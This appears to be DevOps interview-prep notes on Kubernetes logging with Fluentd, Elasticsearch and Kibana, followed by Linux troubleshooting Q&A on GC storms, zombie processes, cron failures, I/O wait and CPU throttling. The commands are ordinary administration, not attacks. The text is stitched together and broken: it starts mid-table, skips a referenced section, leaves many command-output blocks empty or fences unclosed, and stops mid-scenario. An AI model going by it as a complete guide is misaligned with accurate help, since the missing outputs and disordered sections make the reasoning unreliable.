| Memory | ~40–60 MB | ~1–2 MB |
| Plugin ecosystem | 700+ plugins | Fewer but growing |
| Best for | Complex routing, transformations | Lightweight collection |
| Common pattern | Fluent Bit on nodes → Fluentd aggregator → ES |

### Interview Insights

> "In small clusters, Fluentd DaemonSet directly to Elasticsearch works fine. At scale (100+ nodes), use Fluent Bit as the per-node collector and Fluentd as a central aggregator — reduces resource usage per node significantly."

# 3. Log Collection (Fluentd / Fluent Bit)

### What Happens in Production

Fluentd runs as a **DaemonSet** — Kubernetes guarantees one pod per node. It mounts the node's log directory via `hostPath`, tails every container log file, and adds Kubernetes metadata (pod name, namespace, labels) using the `kubernetes_metadata` filter.

### How It Works (FLOW-LEVEL)

```
/var/log/containers/*.log  (hostPath mount)
  → Fluentd <source> (tail input plugin)
  → Parses JSON log lines from container runtime
  → <filter> kubernetes_metadata: adds pod/namespace/label fields
  → <filter> parser: parses app-specific log format (if needed)
  → <match> elasticsearch: sends enriched event to Elasticsearch
```

### Key Configs / Components

**Fluentd DaemonSet — critical volume mounts:**

```yaml
volumeMounts:
  - name: varlog
    mountPath: /var/log
  - name: varlibdockercontainers
    mountPath: /var/lib/docker/containers
    readOnly: true
volumes:
  - name: varlog
    hostPath:
      path: /var/log
  - name: varlibdockercontainers
    hostPath:
      path: /var/lib/docker/containers
```

**fluent.conf — minimal production config:**

```xml
# INPUT: tail all container logs
<source>
  @type tail
  path /var/log/containers/*.log
  pos_file /var/log/fluentd-containers.log.pos
  tag kubernetes.*
  read_from_head false
  <parse>
    @type json
    time_format %Y-%m-%dT%H:%M:%S.%NZ
  </parse>
</source>

# FILTER: enrich with Kubernetes metadata
<filter kubernetes.**>
  @type kubernetes_metadata
  @id filter_kube_metadata
</filter>

# FILTER: drop health check noise
<filter kubernetes.**>
  @type grep
  <exclude>
    key $.kubernetes.labels.app
    pattern ^fluentd$
  </exclude>
</filter>

# OUTPUT: send to Elasticsearch
<match kubernetes.**>
  @type elasticsearch
  host elasticsearch.logging.svc.cluster.local
  port 9200
  logstash_format true
  logstash_prefix k8s-logs
  include_tag_key true
  type_name _doc
  <buffer>
    @type file
    path /var/log/fluentd-buffers/kubernetes.system.buffer
    flush_mode interval
    flush_interval 5s
    chunk_limit_size 2M
    total_limit_size 500M
    retry_max_interval 30
    retry_forever true
  </buffer>
</match>
```

### Buffering & Retries

Fluentd buffers events to disk before forwarding. This means:
- If Elasticsearch is temporarily down, logs are queued — not lost
- `retry_forever true` keeps retrying until Elasticsearch is back
- `total_limit_size` caps disk usage — if exceeded, Fluentd drops oldest chunks

**Buffer states to know:**

| State | Meaning |
|---|---|
| `queued` | Waiting to be flushed to output |
| `error` | Failed to send, will retry |
| `secondary` | Overflow to secondary output (S3, etc.) |

### RBAC for Kubernetes Metadata Plugin

Fluentd needs API access to read pod/namespace metadata:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: fluentd
rules:
  - apiGroups: [""]
    resources: ["pods", "namespaces"]
    verbs: ["get", "list", "watch"]
```

### Common Issues

- `pos_file` not on a persistent volume → Fluentd re-reads all logs from beginning after restart → duplicate entries in Elasticsearch
- RBAC missing → kubernetes_metadata filter silently fails → logs land without pod/namespace fields
- Container log format changed (JSON vs plain text) → parse errors → `_grokparsefailure` tagged events

### Debugging Approach

```bash
# Check if Fluentd pod is running on every node
kubectl get pods -n logging -o wide | grep fluentd

# Check Fluentd pod logs for errors
kubectl logs -n logging <fluentd-pod> --tail=100

# Look for buffer errors specifically
kubectl logs -n logging <fluentd-pod> | grep -i "error\|warn\|retry\|buffer"

# Exec into Fluentd pod to check buffer state
kubectl exec -n logging <fluentd-pod> -- ls -lh /var/log/fluentd-buffers/

# Verify hostPath mounts are accessible
kubectl exec -n logging <fluentd-pod> -- ls /var/log/containers/ | head -10
```

### Interview Insights

> "The `pos_file` is critical — it tracks which byte offset Fluentd has read up to in each log file. Without it persisting across restarts, you get massive duplicate log floods in Elasticsearch every time Fluentd is redeployed."

# 4. Log Processing & Forwarding

### What Happens in Production

Fluentd processes logs through a pipeline: **Input → Buffer → Filter → Output**. In production, filters are used to parse application logs, drop noise, add fields, and route logs to different Elasticsearch indices.

### How It Works (FLOW-LEVEL)

```
Raw log line (string from container)
  → <source> tail: reads line, wraps in event object
  → <filter> kubernetes_metadata: adds .kubernetes.* fields
  → <filter> parser: parses log.message if JSON or structured
  → <filter> record_transformer: add custom fields (env, cluster name)
  → <filter> grep: drop health checks, debug noise
  → <match>: route to Elasticsearch with dynamic index name
```

### Key Configs / Components

**Parsing JSON application logs:**

```xml
<filter kubernetes.var.log.containers.**app**.log>
  @type parser
  key_name log
  reserve_data true
  remove_key_name_field true
  <parse>
    @type json
    json_parser oj
  </parse>
</filter>
```

**Adding environment metadata:**

```xml
<filter kubernetes.**>
  @type record_transformer
  <record>
    cluster_name "#{ENV['CLUSTER_NAME']}"
    environment "#{ENV['ENVIRONMENT']}"
  </record>
</filter>
```

**Dynamic index routing by namespace:**

```xml
<match kubernetes.**>
  @type elasticsearch
  index_name k8s-${$.kubernetes.namespace_name}-%Y.%m.%d
  ...
</match>
```

### Interview Insights

> "Parsing JSON at collection time means Elasticsearch gets structured fields immediately — no need for runtime parsing at query time. Always parse at Fluentd level, not in Kibana scripted fields."

---

# 5. Elasticsearch (Storage & Indexing)

### What Happens in Production

Elasticsearch receives log events from Fluentd, creates a document per log line, and stores it in an index. For Kubernetes logs, indices are typically named `k8s-logs-YYYY.MM.DD` (daily rollover via ILM).

### How It Works (FLOW-LEVEL)

```
Fluentd bulk request → Elasticsearch HTTP (port 9200)
  → Coordinating node routes to correct shard
  → Primary shard writes to translog + memory buffer
  → Refresh (every 1s) → Lucene segment (searchable)
  → Replica shard gets copy
  → ILM policy manages lifecycle: hot → warm → cold → delete
```

### Key Configs / Components

**Index template for Kubernetes logs:**

```json
PUT _index_template/k8s-logs-template
{
  "index_patterns": ["k8s-logs-*"],
  "template": {
    "settings": {
      "number_of_shards": 2,
      "number_of_replicas": 1,
      "refresh_interval": "5s",
      "index.lifecycle.name": "k8s-logs-policy",
      "index.lifecycle.rollover_alias": "k8s-logs"
    },
    "mappings": {
      "properties": {
        "@timestamp":     { "type": "date" },
        "log":            { "type": "text" },
        "stream":         { "type": "keyword" },
        "kubernetes": {
          "properties": {
            "namespace_name": { "type": "keyword" },
            "pod_name":       { "type": "keyword" },
            "container_name": { "type": "keyword" },
            "labels": {
              "type": "object",
              "dynamic": false
            }
          }
        }
      }
    }
  }
}
```

> **Why `dynamic: false` on labels?** Kubernetes labels are arbitrary key-value pairs. Without this, each unique label key becomes a new Elasticsearch field — causing mapping explosion (thousands of fields → heap pressure → cluster instability).

**ILM Policy — 7-day hot, 30-day warm, 90-day delete:**

```json
PUT _ilm/policy/k8s-logs-policy
{
  "policy": {
    "phases": {
      "hot": {
        "actions": {
          "rollover": {
            "max_primary_shard_size": "30gb",
            "max_age": "1d"
          }
        }
      },
      "warm": {
        "min_age": "7d",
        "actions": {
          "shrink": { "number_of_shards": 1 },
          "forcemerge": { "max_num_segments": 1 },
          "readonly": {}
        }
      },
      "delete": {
        "min_age": "90d",
        "actions": { "delete": {} }
      }
    }
  }
}
```

### Common Issues

| Issue | Symptom | Fix |
|---|---|---|
| Disk > 85% | Elasticsearch stops allocating new shards (yellow cluster) | Delete old indices or add nodes |
| Disk > 95% | Index goes read-only — Fluentd writes fail | Emergency: delete indices, then `PUT index/_settings {"index.blocks.read_only_allow_delete": null}` |
| Mapping explosion | Cluster state grows, master GC pauses | Add `dynamic: false` on nested object fields |
| Too many shards | Heap pressure, slow cluster state | ILM with proper rollover + shrink in warm phase |

### Debugging Approach

```bash
# Check cluster health
curl -s http://elasticsearch:9200/_cluster/health?pretty

# Check disk usage per node
curl -s http://elasticsearch:9200/_cat/nodes?v&h=name,disk.used_percent,heap.percent

# Find which indices are largest
curl -s http://elasticsearch:9200/_cat/indices?v&s=store.size:desc | head -20

# Check unassigned shards reason
curl -s http://elasticsearch:9200/_cluster/allocation/explain?pretty

# Remove read-only block after disk cleanup
curl -X PUT http://elasticsearch:9200/k8s-logs-*/_settings \
  -H 'Content-Type: application/json' \
  -d '{"index.blocks.read_only_allow_delete": null}'
```

### Interview Insights

> "The two most common production Elasticsearch emergencies are: disk full (index goes read-only, Fluentd starts erroring) and mapping explosion from dynamic label fields. Both are preventable — ILM handles disk, and `dynamic: false` on labels field prevents explosion."

---

# 6. Kibana (Visualization)

### What Happens in Production

Kibana connects to Elasticsearch and provides a UI to search, filter, and visualize log data. In EFK production setups, the primary use case is **log search during incidents**.

### Key Configs / Components

**Data View setup** (must do before searching):

```
Kibana → Stack Management → Data Views → Create
  Index pattern: k8s-logs-*
  Timestamp field: @timestamp
```

**Most-used Kibana features in production:**

| Feature | Use |
|---|---|
| Discover | Search raw logs — main incident tool |
| KQL filter bar | `kubernetes.namespace_name: "production" AND log: "ERROR"` |
| Time range selector | Narrow to incident window |
| Field filters (left panel) | Filter by pod_name, container_name |
| Surrounding documents | See what happened before/after an error |
| Saved searches | Pre-built queries for recurring investigations |
| Dashboard | Error rate over time per namespace |

**Useful KQL queries for Kubernetes:**

```
# All errors from a namespace
kubernetes.namespace_name: "payment" AND log: "ERROR"

# Logs from a specific pod
kubernetes.pod_name: "payment-api-7d4f9b-x2kqp"

# CrashLoopBackOff investigation
kubernetes.container_name: "payment" AND log: ("OOMKilled" OR "exit code")

# High volume from one service
kubernetes.labels.app: "order-service" AND log: "Exception"
```

### Interview Insights

> "In production incidents, Kibana Discover with a narrow time range + namespace filter + 'ERROR' keyword gets you to the root cause log in under 2 minutes. That's the core value."

# 8. Troubleshooting in Production ⚠️

> All debugging references the flow defined in **Section 7**.

---

## Problem 1: Logs Not Appearing in Kibana

### Debugging Approach

Work backwards through the flow (Section 7):

**Step 1 — Is the app actually writing to stdout?**
```bash
kubectl logs <pod-name> -n <namespace> --tail=20
# If empty: app is writing to a file inside container, not stdout
```

**Step 2 — Is the log file on the node?**
```bash
# SSH to the node where the pod runs
ls /var/log/containers/ | grep <pod-name>
# If missing: container runtime issue or pod just started
```

**Step 3 — Is Fluentd running on that node?**
```bash
kubectl get pods -n logging -o wide | grep <node-name>
# If no Fluentd pod: DaemonSet tolerations may be missing for that node
```

**Step 4 — Is Fluentd tailing and forwarding?**
```bash
kubectl logs -n logging <fluentd-pod-on-that-node> --tail=50
# Look for: "following tail of" for the target file
# Look for: errors connecting to Elasticsearch
```

**Step 5 — Is Elasticsearch receiving data?**
```bash
curl -s "http://elasticsearch:9200/k8s-logs-*/_count" | python3 -m json.tool
# Also check for today's index
curl -s "http://elasticsearch:9200/_cat/indices/k8s-logs-$(date +%Y.%m.%d)?v"
```

**Step 6 — Is Kibana using the right data view?**
```
Kibana → Stack Management → Data Views → Refresh fields on k8s-logs-*
Ensure time range in Discover is not filtering out the logs
```

---

## Problem 2: Fluentd Not Collecting Logs from Specific Pods

### Debugging Approach

```bash
# Check if the pod's log file exists on node
kubectl get pod <pod> -n <ns> -o wide  # find which node
# SSH to node:
ls -la /var/log/containers/ | grep <pod>

# Check Fluentd pos_file to see if it's tracking that file
kubectl exec -n logging <fluentd-pod> -- \
  cat /var/log/fluentd-containers.log.pos | grep <pod-name>

# If not tracked: Fluentd may have started before the pod
# Restart Fluentd on that node (delete its pod, DaemonSet recreates it)
kubectl delete pod -n logging <fluentd-pod-on-node>
```

---

## Problem 3: Elasticsearch Disk Full

### Symptoms
- Fluentd logs show: `[warn]: #0 Could not push logs to Elasticsearch`
- Kibana shows no new logs after a certain timestamp
- `_cluster/health` shows `status: red` or `unassigned_shards > 0`

### Debugging Approach

```bash
# Step 1: Confirm disk status
curl "http://elasticsearch:9200/_cat/nodes?v&h=name,disk.used_percent"

# Step 2: Find largest indices
curl "http://elasticsearch:9200/_cat/indices?v&s=store.size:desc" | head -10

# Step 3: Delete oldest indices (carefully)
curl -X DELETE "http://elasticsearch:9200/k8s-logs-2024.01.01"

# Step 4: Remove read-only block Elasticsearch set automatically
curl -X PUT "http://elasticsearch:9200/_all/_settings" \
  -H 'Content-Type: application/json' \
  -d '{"index.blocks.read_only_allow_delete": null}'

# Step 5: Verify Fluentd starts forwarding again
kubectl logs -n logging <fluentd-pod> --tail=30 | grep -i "elasticsearch"

# Prevention: Ensure ILM policy is applied to all k8s-logs-* indices
curl "http://elasticsearch:9200/k8s-logs-*/_ilm/explain?pretty" | grep phase
```

---

## Problem 4: High Ingestion Delay (Logs Appearing Late)

### Symptoms
- Logs visible in Kibana 5–10 minutes after pod writes them
- Fluentd buffer directory growing on node

### Debugging Approach

```bash
# Step 1: Check Fluentd buffer size on node
kubectl exec -n logging <fluentd-pod> -- \
  du -sh /var/log/fluentd-buffers/

# If buffer is large (> 100MB): Elasticsearch is slow to accept
# → Check Elasticsearch indexing pressure
curl "http://elasticsearch:9200/_nodes/stats/indices?pretty" | \
  grep -A5 "indexing"

# Step 2: Check Elasticsearch JVM heap (high = GC slowing ingestion)
curl "http://elasticsearch:9200/_cat/nodes?v&h=name,heap.percent"
# > 75% heap = GC pressure

# Step 3: Check if too many shards (causes heap pressure)
curl "http://elasticsearch:9200/_cat/shards?v" | wc -l

# Step 4: Check Fluentd flush settings
# Reduce flush_interval in buffer config (e.g., 5s → 2s)
# Increase chunk_limit_size if many small flushes
```

---

## Problem 5: Missing Logs from Specific Namespace

### Debugging Approach

```bash
# Step 1: Verify logs exist on node filesystem
kubectl get pods -n <namespace> -o wide  # find nodes
# On the node:
ls /var/log/containers/ | grep <namespace>

# Step 2: Check if Fluentd is filtering them out
# Look for grep/exclude filters in fluent.conf that might drop that namespace
kubectl get configmap fluentd-config -n logging -o yaml | grep -A5 "exclude"

# Step 3: Check if Fluentd has RBAC access to that namespace
kubectl auth can-i list pods --as=system:serviceaccount:logging:fluentd -n <namespace>

# Step 4: Search Elasticsearch directly (bypass Kibana)
curl "http://elasticsearch:9200/k8s-logs-*/_search" \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "term": { "kubernetes.namespace_name": "<namespace>" }
    },
    "size": 5
  }'
```

---

## Problem 6: High CPU Usage in Fluentd

### Symptoms
- Fluentd pods hitting CPU limits → throttled → log delay
- Node CPU spike correlating with high log volume pod

### Debugging Approach

```bash
# Step 1: Identify which pod is generating excessive logs
kubectl top pods -n <namespace> --sort-by=cpu
# Also check log volume
kubectl logs <high-cpu-pod> --since=1m | wc -l

# Step 2: Check Fluentd worker count
# In fluent.conf, increase workers for parallelism:
# <system>
#   workers 4
# </system>

# Step 3: Add noise-reduction filter for chatty pods
# In fluent.conf, drop DEBUG logs at collection time:
<filter kubernetes.var.log.containers.**chatty-pod**.log>
  @type grep
  <exclude>
    key log
    pattern /DEBUG|TRACE/
  </exclude>
</filter>

# Step 4: Check if regex in filters is causing CPU spike
# Complex regex patterns on every log line = CPU cost
# Simplify or remove unnecessary parse filters
```

---

## Problem 7: Duplicate Log Entries in Kibana

### Root Cause
`pos_file` not persisted across Fluentd pod restarts. On restart, Fluentd re-reads from beginning.

### Fix

```yaml
# Ensure pos_file is on a hostPath volume (not emptyDir)
volumeMounts:
  - name: fluentd-pos
    mountPath: /var/log/fluentd-pos

volumes:
  - name: fluentd-pos
    hostPath:
      path: /var/log/fluentd-pos
      type: DirectoryOrCreate
```

```xml
# In fluent.conf source block:
<source>
  @type tail
  pos_file /var/log/fluentd-pos/containers.log.pos  # ← persisted path
  ...
</source>
```

---

## Quick Diagnostic Cheat Sheet

```bash
# === FLUENTD ===
kubectl get pods -n logging -o wide                          # All fluentd pods
kubectl logs -n logging <pod> --tail=50                      # Fluentd errors
kubectl exec -n logging <pod> -- du -sh /var/log/fluentd-buffers/  # Buffer size

# === ELASTICSEARCH ===
curl es:9200/_cluster/health?pretty                          # Cluster status
curl "es:9200/_cat/nodes?v&h=name,disk.used_percent,heap.percent"  # Node health
curl "es:9200/_cat/indices?v&s=store.size:desc" | head -10  # Largest indices
curl "es:9200/_cluster/allocation/explain?pretty"           # Why shard unassigned

# === LOG VERIFICATION ===
kubectl logs <pod> --tail=20                                 # Pod actually logging?
ls /var/log/containers/ | grep <pod>                        # File on node?
curl "es:9200/k8s-logs-*/_count"                            # Docs in ES?

# === KIBANA ===
# Ensure Data View is k8s-logs-* with @timestamp
# Time range: set to last 15 minutes when debugging
# If no results: try removing all filters, expand time range
```

## Interview Insights — Troubleshooting Section

> "When logs are missing, always follow the flow: stdout → node file → Fluentd tailing → Fluentd buffer → Elasticsearch → Kibana. Eliminate each stage systematically. 90% of issues are either the app not writing to stdout, or Elasticsearch disk full triggering read-only mode."

> "pos_file is the single most common misconfiguration in Fluentd. Everyone forgets to persist it. When they restart Fluentd for a config change, they flood Elasticsearch with historical duplicates."

> "For Elasticsearch disk issues in production, the immediate fix is deleting old indices. The real fix is ILM with a retention policy set before you go to production — not after."

### Q: A production Java microservice on an EKS node is consuming 100% CPU and the pod keeps getting OOMKilled. How do you identify the root process, understand its thread activity, and decide whether to kill or throttle it?

**Answer:**

**Situation:** An alert fires in PagerDuty — `CPUThrottlingHigh` and `OOMKilled` for pod `payment-service-7d9f8b-xkvp2`. The node is `ip-10-0-1-45.ap-south-1.compute.internal`. You SSH into the node.

**Symptoms:**
- Pod restarts 6 times in 10 minutes
- Node CPU runqueue depth is elevated
- `kubectl top pod` shows 1800m CPU for a 500m limit container

**Step 1: Identify the top CPU consumer**

```bash
# On the EKS node — broad process view sorted by CPU
top -b -n 1 -o %CPU | head -30
```

```

```

> **Critical observation:** `GC Thread#0` through `GC Thread#3` are each consuming ~48% CPU. This is a **GC storm** — the JVM is spending almost all time garbage collecting rather than doing useful work. This is the classic sign of **Java heap exhaustion** — GC is running continuously but cannot free enough memory (< 2% heap free threshold triggers OOM in most JVMs).

**Step 4: Get a thread dump for proof**

```bash
# Convert top thread PID (decimal) to hex for jstack mapping
printf '%x\n' 28763

```bash
# Send signal to Java process to dump threads (requires same user or root)
kill -3 28741
# Or use jstack if JDK is in container

```

```

> **Confirmed GC storm.** The threads have been running for 2537 seconds — 42 minutes — meaning the heap has been exhausted for nearly the entire pod uptime.

**Step 5: Check GC log if mounted**

```bash
nsenter -t 28741 -m -- find /app -name "gc*.log" 2>/dev/null
```

```
/app/logs/gc-2024-01-15.log
```

```bash

```

> **The smoking gun:** Full GC is running every 8-9 seconds and recovering 0-1 MB each time. The heap is at maximum and cannot grow further. The app is allocating faster than GC can collect.

**Decision:** This process cannot recover on its own. The correct action is:

```bash
# Option 1: Let Kubernetes OOMKill it (set memory limit correctly in pod spec)
# Option 2: Manual kill to trigger restart NOW
kill -9 28741  # SIGKILL — immediate termination

# Verify the pod restarts via Kubernetes
kubectl get pod payment-service-7d9f8b-xkvp2 -w
```

```

payment-service-7d9f8b-xkvp2   1/1     Running     7          15m
```

**Root cause:** Java heap `-Xmx` was not tuned for the container memory limit, or a memory leak is gradually exhausting the heap. Long-term fix: add `-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/tmp/heapdump.hprof` and analyze with Eclipse MAT.

### Q: You find a zombie process on a production host. How do you identify it, understand why it exists, and clean it up without rebooting?

**Answer:**

**Situation:** During routine node health check you notice the process count is abnormally high. A monitoring alert fires for `node_processes_zombies > 50`.

**Symptoms:**
- `ps` shows several processes with state `Z`
- `wait()` syscall accumulation in kernel metrics

**Step 1: Find zombie processes**

```bash
ps aux | awk '$8 == "Z" {print}'
```

```
root     14821  0.0  0.0      0     0 ?        Z    11:22   0:00 [defunct]
root     14822  0.0  0.0      0     0 ?        Z    11:22   0:00 [defunct]
root     14823  0.0  0.0      0     0 ?        Z    11:22   0:00 [defunct]
node     14901  0.0  0.0      0     0 ?        Z    11:23   0:00 [node]
node     14902  0.0  0.0      0     0 ?        Z    11:23   0:00 [node]
```

> **Observation:** 5 zombie processes. The `[defunct]` label means the process has exited but its parent has not called `wait()` to reap it. The process entry stays in the kernel process table to preserve exit status.

**Step 2: Find the parent (who is responsible for reaping)**

```bash
# Check parent PID of zombie
ps -o pid,ppid,stat,comm -p 14821
```

```
  PID  PPID STAT COMMAND
14821 14800 Z    (defunct)
```

```bash
# Identify the parent process
ps -o pid,ppid,stat,comm -p 14800
```

```
  PID  PPID STAT COMMAND
14800  1    S    node
```

```bash
# Check what the parent (node) process is doing
ls -la /proc/14800/fd | wc -l
```

```
312
```

```bash
# See the full command line
cat /proc/14800/cmdline | tr '\0' ' '
```

```
node /app/worker.js --workers=10 --no-wait-reap
```

> **Root cause identified:** A Node.js worker script is spawning child processes with `--no-wait-reap` (a custom flag). The parent process is NOT calling `wait()` on its children after they exit, so the kernel keeps their process table entries (zombies) alive indefinitely.

**Step 3: Confirm with strace**

```bash
# Check if parent is making any wait() calls
strace -p 14800 -e trace=wait4,waitpid -f 2>&1 | head -20
```

```
strace: Process 14800 attached
strace: Process 14801 attached
[pid 14800] epoll_wait(7, [{EPOLLIN, {u32=8, u64=8}}], 1024, 100) = 1
[pid 14800] read(8, "\n", 131072)       = 1
[pid 14800] epoll_wait(7, [], 1024, 100) = 0
[pid 14800] epoll_wait(7, [], 1024, 100) = 0
```

> **Confirmed:** `epoll_wait` calls but ZERO `wait4` or `waitpid` syscalls. The parent is not reaping children.

**Step 4: Options to clean without rebooting**

```bash
# Option 1: Send SIGCHLD to parent to trigger reaping (safe)
kill -SIGCHLD 14800

# Check if zombies disappeared
ps aux | awk '$8 == "Z"' | wc -l
```

```
5
```

> **SIGCHLD did not help** — the parent ignores SIGCHLD or has explicitly set `SIG_IGN` for it (which would actually auto-reap). The parent has a bug.

```bash
# Option 2: Kill the parent — this orphans children to init (PID 1) which WILL reap them
kill -15 14800  # SIGTERM first

# Verify
sleep 2
ps aux | awk '$8 == "Z"' | wc -l
```

```
0
```

> **Success.** When the parent dies, all zombie children are reparented to PID 1 (init/systemd), which calls `wait()` automatically and cleans them up. The service manager will restart the parent.

**Key interview insight:**
- A zombie is NOT a runnable process — it uses no CPU or memory, only a process table slot
- You CANNOT kill a zombie with `kill -9` — it's already dead; only the parent can reap it
- If the parent is PID 1 (init) and zombies accumulate, that's a bug in init itself — reboot required
- Zombies become a problem only when they fill the PID table (typically 32768 on Linux)

### Q: Your production cron job is not running. You suspect a process scheduling issue. How do you debug whether the job ran, why it might have failed silently, and how to prevent it in future?

**Answer:**

**Situation:** A nightly database backup cron job has not produced output files for 3 days. No alerts fired because the monitoring only checks for file existence, and the old files are still present (not overwritten due to the bug).

**Step 1: Check if cron daemon is running**

```bash
systemctl status cron
# or on RHEL/CentOS
systemctl status crond
```

```
● cron.service - Regular background program processing daemon
     Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)

     CGroup: /system.slice/cron.service
             └─1235 /usr/sbin/cron -f
```

> **Cron is running.** Not a daemon issue.

**Step 2: Check cron logs**

```bash
# Check syslog for cron entries
grep CRON /var/log/syslog | grep backup | tail -20
```

```
Jan 15 02:00:01 prod-db-01 CRON[28941]: (root) CMD (/opt/scripts/backup.sh >> /var/log/backup.log 2>&1)

Jan 14 02:00:01 prod-db-01 CRON[27832]: (CRON) INFO (No MTA installed, discarding output)
```

> **Cron IS invoking the script.** But notice: `No MTA installed, discarding output`. This means any mail/output that cron normally sends is being silently discarded.

**Step 3: Check the backup log**

```bash
tail -50 /var/log/backup.log
```

```

```

> **Root cause:** Database password was rotated 3 days ago (matches the failure start) but the backup script was not updated. The email alert in the script also failed silently because there's no MTA.

**Step 4: Check the crontab and script**

```bash
crontab -l -u root
```

```
# Backup runs at 2am daily
0 2 * * * /opt/scripts/backup.sh >> /var/log/backup.log 2>&1

# NOTE: the script exit code is swallowed by the shell redirection context

cat /opt/scripts/backup.sh
```

```bash
#!/bin/bash
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Starting backup for database prod_payments"
mysqldump -h prod-payments.cluster-xyz.rds.amazonaws.com \
  -u backup_user \
  -p"$(cat /etc/backup/.db_password)" \
  prod_payments > /backup/prod_payments_$(date +%Y%m%d).sql

if [ $? -ne 0 ]; then
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Backup FAILED with exit code 1"
    echo "Backup failed" | mail -s "ALERT: Backup Failed" ops-team@company.com
fi
```

**Step 5: Fix the immediate problem and harden for future**

```bash
# Update the password
echo "new_secure_password_here" > /etc/backup/.db_password
chmod 600 /etc/backup/.db_password

# Test manually before relying on cron
/opt/scripts/backup.sh
echo "Exit code: $?"
```

```

[2024-01-15 14:45:04] Backup completed: /backup/prod_payments_20240115.sql (2.3GB)
Exit code: 0
```

**Hardening the crontab — use `chronic` and proper alerting:**

```bash
# Install moreutils (provides chronic — runs command silently on success, outputs on failure)
apt-get install -y moreutils

# Updated crontab
crontab -e
```

```
# Best practice: use chronic so cron only generates mail on failure
# Use MAILTO to route to a real address or webhook
MAILTO=ops-team@company.com
0 2 * * * chronic /opt/scripts/backup.sh
```

**Interview insight:**
- Cron jobs fail silently by default — always redirect output AND set up external monitoring (e.g., check for file newer than 25h)
- `2>&1` in crontab redirects stderr to stdout; without it, errors vanish if no MTA
- Use `set -euo pipefail` inside bash scripts run from cron
- For critical jobs, use a "dead man's switch" monitoring pattern: job pings a URL on success; monitoring alerts if no ping received in expected window (e.g., Healthchecks.io, Cronitor)

## 2. CPU Understanding

---

### Q: A Node experiences high load average (15.0) but CPU utilization shows only 20% in top. How do you diagnose whether this is I/O wait, lock contention, or something else?

**Answer:**

**Situation:** A Kubernetes node running stateful workloads (PostgreSQL + ElasticSearch pods) has a load average of 15.0 on a 4-core machine. `top` shows 20% CPU usage. Pods are running slowly but not crash-looping.

**Key concept:** Load average counts ALL runnable + UNINTERRUPTIBLE sleep (D-state) processes. High load with low CPU = processes are waiting, not computing.

**Step 1: Identify the D-state processes**

```bash
# Check system-wide
uptime
```

```
 14:55:12 up 22 days,  4:23,  1 user,  load average: 15.23, 14.87, 13.42
```

```bash
# Find D-state (uninterruptible sleep) processes
ps aux | awk '$8 ~ /D/ {print $0}'
```

```

elastic  33014  3.8  8.2 8234512 1342341 ?     D    14:54   6:54 java
```

> **Key observation:** PostgreSQL checkpointer, walwriter, and ElasticSearch Java threads are all in D-state. D-state = waiting for I/O (disk, network block device). This is an **I/O bottleneck**, not a CPU bottleneck.

**Step 2: Confirm with iostat**

```bash
iostat -xz 1 5
```

```
Device            r/s     w/s     rkB/s     wkB/s   rrqm/s   wrqm/s  %rrqm  %wrqm r_await w_await aqu-sz rareq-sz wareq-sz  svctm  %util

```

> **Smoking gun:**
> - `%util: 99.8` — disk is 100% saturated
> - `w_await: 127.43ms` — writes are waiting 127ms on average (healthy SSD: <1ms)
> - `aqu-sz: 112.3` — 112 requests queued behind each other

**Step 3: Find which process is driving the writes**

```bash
# Use iotop to see per-process I/O
iotop -b -n 3 -o  # -o = only show processes doing I/O
```

```
Total DISK READ :       4.23 M/s | Total DISK WRITE :      96.4 M/s

```

> **PostgreSQL checkpointer is writing 41 MB/s continuously.** This happens when `checkpoint_completion_target` is too aggressive or `shared_buffers` is undersized causing dirty pages to be flushed constantly.

**Step 4: Check vmstat for context**

```bash
vmstat 1 5
```

```
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st

```

> **`wa` (I/O wait) is 57-58%** — over half the CPU time is wasted waiting for I/O. `r=15-16` confirms 15+ processes in run queue (maps to load average). `b=8-9` shows 8-9 processes in uninterruptible D-state.

**Resolution path:**
```bash

### Q: You need to investigate CPU throttling on a container in EKS. The app reports high latency but CPU metrics look fine. How do you diagnose CFS throttling?

**Answer:**

**Situation:** A Go API service has p99 latency of 800ms (SLO: 200ms) but `kubectl top pod` shows only 180m CPU against a 500m limit. The developer insists the service is not CPU-bound.

**Key concept:** CFS (Completely Fair Scheduler) throttling happens at a per-period level (default 100ms). Even if average CPU looks fine, a burst within a 100ms window can hit the limit, causing the container to be paused for the rest of that period — creating latency spikes invisible in average metrics.

**Pod Sandbox**
- First container created for a pod (pause container)
- Holds: Network namespace (IP), IPC namespace
- All other containers join this sandbox

**Step 1: Read CFS throttling stats from cgroups**

- `crictl` is used to get the Pod Sandbox ID(s) of pods whose name matches payment-api using the container runtime (like containerd / CRI-O). Talks to runtime via CRI (Container Runtime Interface)
```bash
# SSH to the node, find the container's cgroup
POD_ID=$(crictl pods --name payment-api -q)
CONTAINER_ID=$(crictl ps --pod $POD_ID -q)
echo "Container: $CONTAINER_ID"
```

```
Container: a8b3c1d2e4f5
```

```bash
# Find cgroup path
cat /proc/$(crictl inspect $CONTAINER_ID | jq -r '.info.pid')/cgroup | grep cpu | head -3
```

```
8:cpu,cpuacct:/kubepods/burstable/pod8a9b0c1d2e3f/a8b3c1d2e4f5
```

```bash
# Read throttling stats
cat /sys/fs/cgroup/cpu/kubepods/burstable/pod8a9b0c1d2e3f/a8b3c1d2e4f5/cpu.stat
```

```
nr_periods 143421
nr_throttled 98234
throttled_time 234123456789
```

> **Critical finding:**
> - `nr_periods`: 143,421 scheduling periods elapsed (100ms each)
> - `nr_throttled`: 98,234 periods where the container was throttled
> - **Throttle rate: 98234/143421 = 68.5%** — the container is being throttled in 68% of scheduling periods!
> - `throttled_time`: ~234 seconds total time the container was paused

**Step 2: Check the CPU quota settings**

```bash
cat /sys/fs/cgroup/cpu/kubepods/burstable/pod8a9b0c1d2e3f/a8b3c1d2e4f5/cpu.cfs_quota_us
cat /sys/fs/cgroup/cpu/kubepods/burstable/pod8a9b0c1d2e3f/a8b3c1d2e4f5/cpu.cfs_period_us
```

```
50000
100000
```

